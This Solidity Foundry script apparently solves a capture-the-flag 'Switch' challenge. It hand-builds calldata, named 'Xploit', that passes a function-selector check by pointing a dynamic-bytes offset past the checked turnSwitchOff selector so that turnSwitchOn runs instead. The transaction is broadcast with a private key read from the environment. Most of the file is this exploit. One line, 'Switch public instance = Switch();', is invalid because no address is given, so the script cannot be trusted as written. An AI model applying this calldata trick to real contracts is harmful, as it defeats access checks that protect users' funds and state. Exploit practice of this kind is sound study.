// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Switch } from "../src/Switch.sol";


contract Test {
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    function test(bytes memory _data) public returns (bytes4) {

        bytes32[1] memory selector;

        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");


		// return bytes4(selector[0]);

        (bool success,) = address(this).call(_data);
    }

}


contract SwitchSolver is Script {
	
	Switch public instance = Switch();
	// Switch public instance = new Switch();
	bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()")); // 543190549 0x20606e15
	bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()")); // 1981971986 0x76227e12
	bytes4 public flipSelector = bytes4(keccak256("flipSwitch(bytes)"));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

		
		bytes memory Xploit = bytes.concat(
			bytes4(flipSelector),
			bytes32(uint256(0x60)),
			bytes32(uint256(4)),
			bytes32(offSelector),
			bytes32(uint256(4)),
			bytes32(offSelector),
			bytes32(uint256(4)),
			bytes4(onSelector)
		);

		console.logBytes(Xploit);



		console.log(instance.switchOn());

		address(instance).call(Xploit);

		console.log(instance.switchOn());



		vm.stopBroadcast();


	}

}
